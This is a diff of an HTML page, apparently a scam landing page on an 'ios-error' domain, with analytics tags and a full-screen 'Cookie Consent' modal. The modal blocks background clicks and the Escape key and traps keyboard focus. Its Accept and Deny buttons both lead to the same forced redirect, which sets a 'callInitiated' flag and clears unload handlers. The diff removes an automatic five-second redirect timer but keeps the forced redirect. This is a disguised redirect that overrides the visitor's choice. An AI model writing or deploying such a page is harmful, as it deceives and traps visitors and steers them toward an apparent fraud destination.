@@ -16,17 +16,19 @@
   gtag('config', 'G-VCBLXTQNVQ');
 </script>
 
-<!-- StatCounter (final) -->
+<!-- StatCounter -->
 <script type="text/javascript">
-var sc_project=13188833; 
-var sc_invisible=1; 
-var sc_security="4224cf98"; 
+  var sc_project=13188833; 
+  var sc_invisible=1; 
+  var sc_security="4224cf98"; 
 </script>
 <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
 <noscript>
-  <div class="statcounter"><a title="Web Analytics Made Easy - Statcounter" href="https://statcounter.com/" target="_blank">
-    <img class="statcounter" src="https://c.statcounter.com/13188833/0/4224cf98/1/" alt="Web Analytics Made Easy - Statcounter" referrerPolicy="no-referrer-when-downgrade">
-  </a></div>
+  <div class="statcounter">
+    <a title="Web Analytics Made Easy - Statcounter" href="https://statcounter.com/" target="_blank">
+      <img class="statcounter" src="https://c.statcounter.com/13188833/0/4224cf98/1/" alt="Web Analytics Made Easy - Statcounter" referrerPolicy="no-referrer-when-downgrade">
+    </a>
+  </div>
 </noscript>
 
 <style>
@@ -257,14 +259,16 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
   </div>
 </footer>
 
-<!-- COOKIE CONSENT MODAL with 5-second auto-redirect (Accept/Deny -> same URL) -->
-<div id="cookieModalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);display:flex;justify-content:center;align-items:center;z-index:99999;padding:20px;">
-  <div id="cookieModal" role="dialog" aria-modal="true" style="background:#fff;max-width:420px;width:100%;padding:22px;border-radius:12px;text-align:center;font-family:Inter, sans-serif;box-shadow:0 8px 30px rgba(2,6,23,0.2);">
-    <h2 style="margin-top:0;color:#b04a8a;font-size:20px;">Cookie Consent</h2>
-    <p style="color:#374151;font-size:15px;margin:10px 0 16px;">
+<!-- COOKIE CONSENT MODAL: no auto-timer, redirect on Accept/Deny -->
+<div id="cookieModalOverlay">
+  <div id="cookieModal" role="dialog" aria-modal="true">
+    <h2>Cookie Consent</h2>
+    <p>
       We use cookies to improve your browsing experience. Please choose to Accept or Deny cookies to continue.
     </p>
-    <div id="countdownDisplay" class="countdown-timer">Redirecting in 5 seconds...</div>
+    <div id="countdownDisplay" class="countdown-timer">
+      Please select an option to continue.
+    </div>
     <div style="display:flex;gap:10px;margin-top:18px;justify-content:center;">
       <button id="acceptCookies" type="button" class="cookie-btn cookie-accept">Accept</button>
       <button id="denyCookies" type="button" class="cookie-btn cookie-deny">Deny</button>
@@ -278,43 +282,39 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
   const overlay = document.getElementById('cookieModalOverlay');
   const acceptBtn = document.getElementById('acceptCookies');
   const denyBtn = document.getElementById('denyCookies');
-  const countdownDisplay = document.getElementById('countdownDisplay');
 
   // Prevent background scroll while modal is visible
   const prevOverflow = document.body.style.overflow;
   document.body.style.overflow = 'hidden';
 
-  // Countdown + redirect
-  let secondsRemaining = 5;
-  const interval = setInterval(() => {
-    secondsRemaining--;
-    if (secondsRemaining > 0) {
-      countdownDisplay.textContent = `Redirecting in ${secondsRemaining} second${secondsRemaining !== 1 ? 's' : ''}...`;
-    } else {
-      countdownDisplay.textContent = 'Redirecting now...';
-      clearInterval(interval);
-      attemptRedirect();
-    }
-  }, 1000);
-
-  // Only block clicks directly on overlay background — allow clicks inside modal
+  // Block clicks on background (overlay), allow inside modal
   overlay.addEventListener('click', function(e){
-    if (e.target === overlay) { e.preventDefault(); e.stopPropagation(); }
+    if (e.target === overlay) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
   }, false);
 
-  // Basic keyboard trapping: prevent Escape and keep Tab inside the two buttons
+  // Basic keyboard trapping: prevent Escape, keep Tab inside the two buttons
   window.addEventListener('keydown', function(e){
     if (e.key === 'Escape' || e.key === 'Esc') {
-      e.preventDefault(); e.stopPropagation();
+      e.preventDefault();
+      e.stopPropagation();
       return false;
     }
     if (e.key === 'Tab') {
       const focusable = [acceptBtn, denyBtn];
       const idx = focusable.indexOf(document.activeElement);
       if (e.shiftKey) {
-        if (idx <= 0) { e.preventDefault(); focusable[focusable.length - 1].focus(); }
+        if (idx <= 0) {
+          e.preventDefault();
+          focusable[focusable.length - 1].focus();
+        }
       } else {
-        if (idx === -1 || idx === focusable.length - 1) { e.preventDefault(); focusable[0].focus(); }
+        if (idx === -1 || idx === focusable.length - 1) {
+          e.preventDefault();
+          focusable[0].focus();
+        }
       }
     }
   }, true);
@@ -327,12 +327,10 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
   }
 
   function attemptRedirect() {
-    // mark redirect intentional for other scripts
     window.callInitiated = true;
     clearBeforeUnload();
-    // restore scroll
+    // restore scroll (not that user will see, but good practice)
     document.body.style.overflow = prevOverflow || '';
-    // Use replace for immediate redirect (no history entry)
     try {
       window.location.replace(redirectURL);
     } catch (err) {
@@ -341,24 +339,30 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
   }
 
   acceptBtn.addEventListener('click', function(e){
-    e.preventDefault(); e.stopPropagation();
-    clearInterval(interval);
+    e.preventDefault();
+    e.stopPropagation();
     attemptRedirect();
   });
 
   denyBtn.addEventListener('click', function(e){
-    e.preventDefault(); e.stopPropagation();
-    clearInterval(interval);
+    e.preventDefault();
+    e.stopPropagation();
     attemptRedirect();
   });
 
 })();
 </script>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-</body>
-</html>
+  gtag('config', 'G-VCBLXTQNVQ');
+</script>
 <!-- Default Statcounter code for ios
-https://sage-daifuku-c375d0.netlify.app -->
+https://ios-error-cyvbq.ondigitalocean.app -->
 <script type="text/javascript">
 var sc_project=13188833; 
 var sc_invisible=1; 
@@ -367,10 +371,12 @@ var sc_security="4224cf98";
 <script type="text/javascript"
 src="https://www.statcounter.com/counter/counter.js"
 async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
+<noscript><div class="statcounter"><a title="web statistics"
 href="https://statcounter.com/" target="_blank"><img
 class="statcounter"
 src="https://c.statcounter.com/13188833/0/4224cf98/1/"
-alt="Web Analytics"
+alt="web statistics"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
+</body>
+</html>
